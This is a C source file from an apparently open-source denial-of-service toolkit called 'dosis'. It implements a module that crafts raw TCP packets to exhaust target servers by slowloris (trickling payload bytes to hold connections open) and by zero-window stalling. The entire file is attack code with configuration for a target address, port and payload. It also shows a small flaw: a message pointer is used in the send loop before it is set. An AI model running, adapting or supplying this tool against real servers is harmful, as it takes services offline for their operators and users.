/*****************************************************************************
 * slowy.c
 *
 * DoS on TCP servers by
 *  - slowloris attack
 *  - zero window size
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "mqueue.h"
#include "slowy.h"
#include "lnet.h"
#include "payload.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"

#define BUFSIZE    2048

typedef struct _tag_TCPCON {
  int         sport;
  int         mss;

  double      timestamp; /* packet timestamp (0 = no packet) */
  double      timeout;
  int         window;    /* current win size                 */
  unsigned    flags;
  unsigned    seq;       /* seq                              */
  unsigned    ack;       /* last acked bytes                 */
  int         offset;    /* current offset                   */
  int         tosend;    /* next bytes to sent               */
  struct _tag_TCPCON *next;
} TCP_CON;

typedef struct _tag_SLOWY_CFG {
  TEA_TYPE_ADDR   shost;
  TEA_TYPE_ADDR   dhost;
  TEA_TYPE_INT         mss;      /* default mss                       */
  TEA_TYPE_INT         window;   /* window                            */
  TEA_TYPE_INT         zerowin;
  double      ltimeout; /* lost-packet timeout */
  double      ntimeout; /* next-packet timeout */
  TEA_TYPE_DATA   payload;
  TCP_CON    *conns[256];
  TCP_CON    *fconns;
  LN_CONTEXT *lnc;
} SLOWY_CFG;


/*****************************************************************************
 * CONN MNGMT
 *****************************************************************************/

static TCP_CON *conn_new(THREAD_WORK *tw, int sport)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
  TCP_CON *c;
  unsigned i;

  /* alloc new conn (if necessary) */
  if(tc->fconns)
  {
    c = tc->fconns;
    tc->fconns = c->next;
  } else
    if((c = calloc(1, sizeof(TCP_CON))) == NULL)
      TFAT("No mem for connection.");

  /* initialize */
  c->sport = sport;

  /* add to conntrack tables */
  i = ((unsigned) sport) >> 8;
  if(tc->conns[i] != NULL)
    c->next = tc->conns[i];
  tc->conns[i] = c;

  return c;
}

static TCP_CON *conn_get(THREAD_WORK *tw, int sport)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
  TCP_CON *c;
  unsigned i;

  i = ((unsigned) sport) >> 8;
  for(c = tc->conns[i]; c && c->sport != sport; c = c->next)
    ;

  return c;
}

static void conn_release(THREAD_WORK *tw, TCP_CON *c)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
  TCP_CON *t;
  unsigned i;

  /* remove conn from conntrack tables */
  i = ((unsigned) c->sport) >> 8;
  if(tc->conns[i] == c)
  {
    tc->conns[i] = c->next;
  } else {
    for(t = tc->conns[i]; t->next && t->next != c; t = t->next)
      ;
    if(t->next == c)
      t->next = c->next;
    else
      TERR("BAD ERROR -- connection %p not found!", c);
  }

  /* add released conn to released conns table */
  c->next = tc->fconns;
  tc->fconns = c;
}

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int slowy__listen_check(THREAD_WORK *tw, char *msg, unsigned int size)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;

  /* check msg size and headers */
  if(size < sizeof(struct iphdr)
  || IP_PROTOCOL(msg) != 6
  || size < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2))
    return 0;

  /* check msg */
  return IP_HEADER(msg)->saddr == tc->dhost.addr.in.addr
      && ntohs(TCP_HEADER(msg)->source) == tc->dhost.port
         ? -1 : 0;
}

static void slowy__listen(THREAD_WORK *tw)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;
  TEA_MSG *m;
  TCP_CON *c;
  int i;
  double t;

  /* listen the radio */
  while(1)
  {
    /*------------------------------------------------------------------------
       SEND PACKETS
      ------------------------------------------------------------------------*/

    /* send scheduled packets */
    t = pthreadex_time_get();
    for(i = 0; i < 256; i++)
      for(c = tc->conns[i]; c; c = c->next)
        if(c->timeout > 0 && t < c->timeout)
        {
          /* send request in one TCP packet */
          ln_send_tcp_packet(tc->lnc,
                             &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                             &tc->dhost.addr.in.inaddr, tc->dhost.port,
                             TH_ACK | TH_PUSH,
                             ntohs(c->window),
                             ntohl(c->seq),
                             ntohl(c->ack),
                             ((char *) tc->payload.data) + c->offset, c->tosend,
                             NULL, 0);
          c->timeout = 0;
        }

    /*------------------------------------------------------------------------
       PROCESS INPUT PACKETS
      ------------------------------------------------------------------------*/

    while((m = tea_thread_msg_get(tw)) != NULL)
    {
      TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
              IP_PROTOCOL(m->b),
              (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
              (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
              (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
              (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
              TCP_HEADER(m->b)->dest, tc->dhost.port,
              TCP_HEADER(m->b)->rst,
              IP_HEADER(m->b)->saddr, tc->shost.addr.in.addr);

      c = conn_get(tw, TCP_HEADER(m->b)->dest);
      if(c)
        TDBG2("  # (%d) continuing connection", c->sport);

      /* in some special case (handshake) send kakita */
      if(TCP_HEADER(m->b)->syn != 0
      && TCP_HEADER(m->b)->ack != 0
      && !c)
      {
        /* register connection */
        c = conn_new(tw, TCP_HEADER(m->b)->dest);
        TDBG2("  # opening connection (%d - %p)", TCP_HEADER(m->b)->dest, c);

        /* get mss */
        c->mss = ln_tcp_get_mss(m->b, m->s);
        TDBG2("  # (%d) mss = %d", c->sport, c->mss);

        /* prepare first request packet to schedule (common for both attacks) */
        c->offset  = 0;
        c->window  = tc->window;
        c->seq     = ntohl(TCP_HEADER(m->b)->ack_seq);
        c->ack     = ntohl(TCP_HEADER(m->b)->seq) + 1;
        c->flags   = TH_ACK;

        /* send handshake */
        TDBG2("  # (%d) sending handshake", c->sport);
        TERR("  # (%d) window %d", c->sport, c->window);
        ln_send_tcp_packet(tc->lnc,
                           &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                           &tc->dhost.addr.in.inaddr, tc->dhost.port,
                           c->flags,
                           c->window,
                           c->seq,
                           c->ack,
                           NULL, 0,
                           NULL, 0);
      }

      if(!c)
      {
        TDBG("Ignored connection at port %d.", TCP_HEADER(m->b)->dest);
        continue;
      }

      if(TCP_HEADER(m->b)->ack != 0)
      {
        int s;

        /* decide how much to send ... */
        s = tc->zerowin ? c->mss : (rand() & 0x07) + 1;

        /* (both) send data (if there is any available) */
        if(c->offset + s < tc->payload.size)
        {
          c->tosend  = s;
          c->flags   = TH_ACK;
        } else {
          c->tosend  = tc->payload.size - c->offset;
          c->flags   = c->tosend > 0 ? TH_ACK | TH_PUSH : TH_ACK;
        }

        /* decide other parameters (depending on attack) */
        c->timestamp = pthreadex_time_get();
        c->timeout   = 0.0;
        if(tc->zerowin)
        {
          /* (zerowin) */
          s = m->s - (TCP_HEADER(m)->doff << 2) - (IP_HEADER(m)->ihl << 2);
          c->window = c->window > s ? c->window - s : 0;
          if(c->window == 0)
            c->timeout = tc->ntimeout;
        } else {
          /* (slowloris) */
          if(c->tosend > 0)
            c->timeout = tc->ntimeout;
        }
      } else
      if(TCP_HEADER(m->b)->fin != 0
      || TCP_HEADER(m->b)->rst != 0)
      {
        /* kill connection */
        /*   - (fin) schedule fin/ack packet */
        if(!TCP_HEADER(m->b)->rst)
          ln_send_tcp_packet(tc->lnc,
                             &tc->shost.addr.in.inaddr, ntohs(TCP_HEADER(m->b)->dest),
                             &tc->dhost.addr.in.inaddr, tc->dhost.port,
                             TH_FIN | TH_ACK,
                             ntohs(TCP_HEADER(m->b)->window),
                             ntohl(TCP_HEADER(m->b)->ack_seq),
                             ntohl(TCP_HEADER(m->b)->seq) + 1,
                             NULL, 0,
                             NULL, 0);

        /*   - (fin&rst) remove directly */
        conn_release(tw, c);
      }

      /* release msg buffer */
      msg_release(m);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int slowy__configure(THREAD_WORK *tw, SNODE *command, int first_time)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;

  /* initialize specialized work thread data */
  if(first_time)
  {
    /* initialize libnet */
    if((tc->lnc = calloc(1, sizeof(LN_CONTEXT))) == NULL)
    {
      TERR("No memory for LN_CONTEXT.");
      return -1;
    }
    ln_init_context(tc->lnc);
  }

  /* select attack type */
  switch(command->command.thc.to->type)
  {
    case TYPE_TO_ZWIN: tc->zerowin = 1; break;
    case TYPE_TO_SLOW: tc->zerowin = 0; break;
    default:
      TERR("Uknown attack type %d.", command->command.thc.to->type);
      return -1;
  }

  /* configure src address (if not defined) */
  /* TODO: check dest address is INET */
  if(tc->dhost.type == INET_FAMILY_NONE)
  {
    TERR("I need a target address.");
    return -1;
  }
  if(tc->shost.type == INET_FAMILY_NONE)
  {
    DOS_ADDR_INFO *ai;
    if((ai = dos_get_interface(&tc->dhost)) == NULL)
    {
      char buff[255];
      ip_addr_snprintf(&tc->shost, sizeof(buff), buff);
      TWRN("Cannot find a suitable source address for '%s'.", buff);
    } else
      ip_addr_copy(&tc->shost, &ai->addr);
  }

  /* (debug) print configuration */
  {
    char buff[255];

    ip_addr_snprintf(&tc->shost, sizeof(buff)-1, buff);
    TDBG2("config.options.shost   = %s", buff);
    ip_addr_snprintf(&tc->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost   = %s", buff);
    TDBG2("config.options.payload = %d bytes", tc->payload.size);
    TDBG2("config.options.winow   = %d bytes", tc->window);
  }

  return 0;
}

static void slowy__cleanup(THREAD_WORK *tw)
{
  SLOWY_CFG *tc = (SLOWY_CFG *) tw->data;

  if(tc)
  {
    /* collect libnet data */
    if(tc->lnc)
    {
      ln_destroy_context(tc->lnc);
      free(tc->lnc);
      tc->lnc = NULL;
    }
    if(tc->payload.data)
    {
      free(tc->payload.data);
      tc->payload.data = NULL;
      tc->payload.size = 0;
    }
    /* free conntrack pool */
    /* XXX TODO XXX */
  }
  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TOC_BEGIN(teaSlowy_cfg)
  TOC("src_addr", TEA_TYPE_ADDR, 0, SLOWY_CFG, shost,   NULL)
  TOC("src_port", TEA_TYPE_PORT, 0, SLOWY_CFG, shost,   NULL)
  TOC("dst_addr", TEA_TYPE_ADDR, 1, SLOWY_CFG, dhost,   NULL)
  TOC("dst_port", TEA_TYPE_PORT, 0, SLOWY_CFG, dhost,   NULL)
  TOC("tcp_mss",  TEA_TYPE_INT,  0, SLOWY_CFG, mss,     NULL)
  TOC("tcp_win",  TEA_TYPE_INT,  0, SLOWY_CFG, window,  NULL)
  TOC("payload",  TEA_TYPE_DATA, 1, SLOWY_CFG, payload, NULL)
TOC_END

TEA_OBJECT teaSlowy = {
  .name         = "Slowy",
  .datasize     = sizeof(SLOWY_CFG),
  .configure    = slowy__configure,
  .cleanup      = slowy__cleanup,
  .listen       = slowy__listen,
  .listen_check = slowy__listen_check,
  .cparams      = teaSlowy_cfg,
};

